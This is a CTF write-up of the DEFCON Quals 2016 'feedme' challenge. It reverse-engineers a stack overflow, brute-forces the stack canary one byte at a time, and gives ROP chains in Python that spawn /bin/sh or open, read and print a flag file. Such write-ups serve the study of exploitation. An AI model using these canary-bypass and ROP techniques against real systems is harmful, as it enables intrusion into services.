CTF: Defcon Quals 2016
Challenge: feedme
Author: Benjamin Charron <bcharron@pobox.com>

Ok, what is this file?

```bash
$ file feedme
feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
```

I love it when it's a 32-bit binary: if r2 and Hopper fail me, I can always use IDA Pro freeware, and I love using IDA.


The first challenge of this file, is that it's statically compiled, so there's
a LOT of code to go through, and I didn't prepare any libc signatures before
the CTF. Fortunately, Hopper analyzed it pretty well, and I was used the string
"FEED ME!" to get me quickly to the interesting part. (I could have used
__libc_start_main as well: its first argument will be the main() function.)

At first, it's hard to make sense of all the code, so I focus on the "FEED ME!"
text string. I assume that the function that follows is a print, so I label it
"some_sort_of_print". The next function is easier, it's very small and it
eventually calls "0x0806fa20", which is an int 0x80. Marking this one as
"do_syscall", the "mov eax, 0x03" just before tells me it's calling the
kernel's sys_read(). Renaming 0x0806d870 "read" really helps reverse the rest.
Eventually, the program looks like this (Hopper decompilation):

```c
int main() {
    signal(14, sigalarm_handler);
    sys_alarm(150);
    eax = *0x80ea4c0;
    sub_804fde0(eax, 0x0, 0x2, 0x0);
    eax = *0x80ea4bc;
    no_clue(eax);
    fork_and_read_input();
    return 0x0;
}

void fork_and_read_input() {
    var_14 = 0x0;
    goto loc_804916b;

loc_804916b:
    if (var_14 <= 0x31f) goto loc_80490c9;

.l1:
    return;

loc_80490c9:
    pid = fork();
    if (pid != 0x0) goto parent;

child:
    eax = receive_hex_string();
    printf_most_likely("YUM, got %d bytes!\n", eax & 0xff);
    return;

parent:
    if (waitpid(pid, 0x0, 0x0) == 0xffffffff) {
            some_sort_of_print("Wait error!");
            possibly_atexit(0xffffffff);
    }
    if (0x0 == 0xffffffff) {
            some_sort_of_print("Child IO error!");
            possibly_atexit(0xffffffff);
    }
    some_sort_of_print("Child exit.");
    sub_804fa20(0x0);
    var_14 = var_14 + 0x1;
    goto loc_804916b;
}

int receive_hex_string() {
    canary = *0x14;
    some_sort_of_print("FEED ME!");
    input_byte = read_one_byte();
    read_n_bytes(local_string_buf, input_byte & 0xff);
    eax = convert_input_to_hex_string(local_string_buf, input_byte & 0xff, 16);
    printf_most_likely("ATE %s\n", eax);
    eax = input_byte & 0xff;
    edx = canary ^ *0x14;
    COND = edx == 0x0;
    if (!COND) {
            eax = stack_smash_detected();
    }
    return eax;
}

char * convert_input_to_hex_string(char * arg_input_string, int arg_input_len, int arg_nb_to_process) {
    nb_to_process = arg_nb_to_process;
    out_pos = 0x0;
    overflow_flag = 0x0;
    if ((arg_input_len & 0xff) > nb_to_process) {
            overflow_flag = 0x1;
    }
    for (src_idx = 0x0; (nb_to_process & 0xff) > src_idx; src_idx = src_idx + 0x1) {
            *(int8_t *)(out_pos + 0x80ebf40) = number_to_ascii_hexa((*(int8_t *)(src_idx + arg_input_string) & 0xff) >> 0x4 & 0xff);
            ebx = out_pos + 0x1;
            out_pos = ebx + 0x1;
            *(int8_t *)(ebx + 0x80ebf40) = number_to_ascii_hexa(*(int8_t *)(src_idx + arg_input_string) & 0xff & 0xff & 0xf);
    }
    *(int8_t *)(out_pos + static_buf) = 0x0;
    if (overflow_flag != 0x0) {
            *(out_pos + static_buf) = 0x2e2e2e;
    }
    return static_buf;
}
```


Ok, so the program reads one byte (len), interprets it as a number of bytes to
read, then reads that many bytes from stdin into a buffer on the stack
(local_string_buf). It will read at most 255 bytes (because of the AND 0xFF),
but the local buffer is only 40-some bytes. Stack smashing! Sounds like a
typical buffer overflow exploit.

BUT, there is a problem: the function is protected with a stack guard. Hmmm, is
it possible to bypass it?  We have the full libc code, is it in order to
identify a weakness in the protector?

I spent a great deal of time looking at the way the guard is formed, assuming
the program ran in a chroot without access to /dev/urandom. When there is no
random available, the stack canary defaults to '0xff0a0000', the "terminator
canary"
(https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/).

However, this ends-up being a dead-end. I am not able to exploit that. So I
decided to call it a night and went to bed.

The next day, re-opening the challenge URLs, I saw a note pointing to
Stanford's BROP paper (http://www.scs.stanford.edu/brop/). (Did I miss this
important note or was the hint added during the night? I don't know.)

Basically, the "Blind Return Oriented Programming (BROP)" can bypass the stack canary provided that:
1. The program exits differently when the canary is triggered
2. We are able to overwrite the canary one byte at a time

What a fantastic idea! But, does it apply to our binary?

1. When the canary is intact, the "receive_hex_string()" function returns and
the program shows "YUM, got %d bytes!". When the canary is corrupted, it exits with just 'Child exit.'.

2. We are definitely able to overflow one byte at a time.


Awesome! The paper came with a script, but it's over 2,000 lines of Ruby and
I'm concerned that it might take more time to understand and modify than just
writing a new one. Also, it's more fun to roll my own, so armed with this
knowledge, I built a small python script that carefully overflows the canary,
one byte at a time. The main loop looks like this:

```python
for canary_idx in range(0, 4):
	ok = False

	for guess in range(0, 256):
		canary[canary_idx] = guess
		payload = generate_canary_guess_payload(BUF_SIZE, canary_idx, canary)
		success = try_payload(client, payload)
```

For each of the 4 bytes, it tries all combinations from 0x00 to 0xFF. When that
byte works (the remote server prints a "YUM"), note the value that succeeded
and start brute-forcing the next byte.

The server limits the number of tries to 800, and it could take up to
256*4=1024 tries to bruteforce all canary bytes, so sometimes the program could
fail to find the canary and get disconnected.

The next step was building an exploit. I wasted a lot of time on this because I
didn't realize that, since ASLR was disabled, the data segment had a fixed
address that I could use to store data. I spent a LOT of time trying to figure
out ESP's address in order to have execve() use "/bin/sh" from the stack.

Once I thought I had a way to leak ESP, I tried to lookup ROP gadgets using R2.
This was the first time I ever used R2 for this, and it wasn't as easy as I
expected. Eventually I gave up and grabbed the amazing ROPgadget
[https://github.com/JonathanSalwan/ROPgadget]

```bash
/rop/ROPgadget/ROPgadget.py --binary feedme --ropchain
Gadgets information
============================================================
0x080e6e47 : aaa ; add dword ptr [edx], ecx ; ret
[snip]
Unique gadgets found: 13930

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x80551a2 mov dword ptr [edx], ecx ; ret
	[+] Gadget found: 0x806f34a pop edx ; ret
	[+] Gadget found: 0x806f371 pop ecx ; pop ebx ; ret
	[-] Can't find the 'xor ecx, ecx' gadget. Try with another 'mov [r], r'

	[+] Gadget found: 0x809a7ed mov dword ptr [edx], eax ; ret
	[+] Gadget found: 0x806f34a pop edx ; ret
	[+] Gadget found: 0x80bb496 pop eax ; ret
	[+] Gadget found: 0x8054a10 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x8054a10 xor eax, eax ; ret
	[+] Gadget found: 0x80497fe inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret
	[+] Gadget found: 0x806f371 pop ecx ; pop ebx ; ret
	[+] Gadget found: 0x806f34a pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049761 int 0x80

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget
	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806f34a) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080bb496) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f34a) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080bb496) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f34a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08054a10) # xor eax, eax ; ret
	p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x080ea060) # padding without overwrite ebx
	p += pack('<I', 0x0806f34a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08054a10) # xor eax, eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x080497fe) # inc eax ; ret
	p += pack('<I', 0x08049761) # int 0x80
```

Wow. ROPgadget is amazing.

Looking at the chain it found, that's when it hit me: ASLR is disabled, the
.data is always in the same spot. I could simply have written my /bin//sh
there. I'm an idiot that just wasted a lot of time.

Ok, cool, so I add that payload to my canary-finder and let her rip on localhost.

Success!  Awesome, let's try for real now.

Failed. Oh no :( I guess the remote server doesn't have /bin/sh in the chroot.

[Edit: Looking at the docker image for feedme released after the CTF, I notice
that /bin/sh *is* there. I'm not sure why the exploit didn't work; I had some
reliability issue early on with my canary finder, maybe the exploit was fine
but the finder messed up?]

Time to find an alternate way to grab the flag.

The flag is typically in a file called "flag" in the $CWD of the binary, so if
I can open("flag"), read() it and write() to stdout, I should be able to get it.

Eventually, I managed to write this:

```python
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb496) # pop eax ; ret
p += 'flag'
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb496) # pop eax ; ret
p += pack('<I', 0x00000000) # trailing NUL

int0x80   = 0x0806fa20
sys_open  = 0x0806d80a
sys_read  = 0x0806d87a
sys_write = 0x0806d8ea

p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x00000000) # open() arg 2: flags (O_RDONLY)
p += pack('<I', 0x080ea060) # open() arg 1: filename ptr ("flag")
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x00000000) # open() arg 3: mode (none)

# syscall 5 (open)
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', int0x80)    # int 0x80

temp_buf_ptr = 0x080ea06C

p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', temp_buf_ptr) # read() arg 2: buf ptr
p += pack('<I', 0x00000002) # read() arg 1: fd
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x00000064) # read() arg 3: size

# syscall 3 (read)
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret

p += pack('<I', int0x80)    # int 0x80


p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', temp_buf_ptr) # write() arg 2: buf ptr
p += pack('<I', 0x00000001) # write() arg 1: stdout
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x00000064) # read() arg 3: size

# syscall 4 (write)
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', int0x80)    # int 0x80
```

<side_problem>
Testing the code required a debugger attached to "feedme", and I
really wanted to use r2 instead of gdb. One of the problems with r2 is what
happens when the program forks. Breakpoints stop working, and I'm not sure what
r2 does. I found a bug report for r2 and decided to just patch-out the fork and
its jump with a few NOPs:

Before:
```
│           0x080490b0      55             push ebp
│           0x080490b1      89e5           mov ebp, esp
│           0x080490b3      83ec28         sub esp, 0x28
│           0x080490b6      c745e8000000.  mov dword [ebp - local_18h], 0
│           0x080490bd      c745ec000000.  mov dword [ebp - local_14h], 0
│       ┌─< 0x080490c4      e9a2000000     jmp 0x804916b
│      ┌──> 0x080490c9      e8a23b0200     call 0x806cc70			; fork
│      ││   0x080490ce      8945f0         mov dword [ebp - local_10h], eax	; pid
│      ││   0x080490d1      837df000       cmp dword [ebp - local_10h], 0
│     ┌───< 0x080490d5      751d           jne 0x80490f4
│     │││   0x080490d7      e85affffff     call 0x8049036			; receive_hex_string
```

After:
```
│           0x080490b0      55             push ebp
│           0x080490b1      89e5           mov ebp, esp
│           0x080490b3      83ec28         sub esp, 0x28
│           0x080490b6      c745e8000000.  mov dword [ebp - local_18h], 0
│           0x080490bd      c745ec000000.  mov dword [ebp - local_14h], 0
│       ┌─< 0x080490c4      e9a2000000     jmp 0x804916b
│      ┌──> 0x080490c9      90             nop
│      ││   0x080490ca      90             nop
│      ││   0x080490cb      90             nop
│      ││   0x080490cc      90             nop
│      ││   0x080490cd      90             nop
│      ││   0x080490ce      8945f0         mov dword [ebp - local_10h], eax	; pid
│      ││   0x080490d1      837df000       cmp dword [ebp - local_10h], 0
│      ││   0x080490d5      90             nop
│      ││   0x080490d6      90             nop
│     │││   0x080490d7      e85affffff     call 0x8049036			; receive_hex_string
```


In the end, I used both r2's -d and Hopper's remote gdb to debug it. Both are really nice.

With r2, I used this to debug:

I created a file `prof.rr2`:
```
program=./feedme.patched-no-canary
stdin=oo
```

And started the debugging with `r2 -de dbg.profile=prof.rr2 feedme.patched`
</side_problem>


Fortunately the open/read/write worked and I got the flag!!

"It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO"

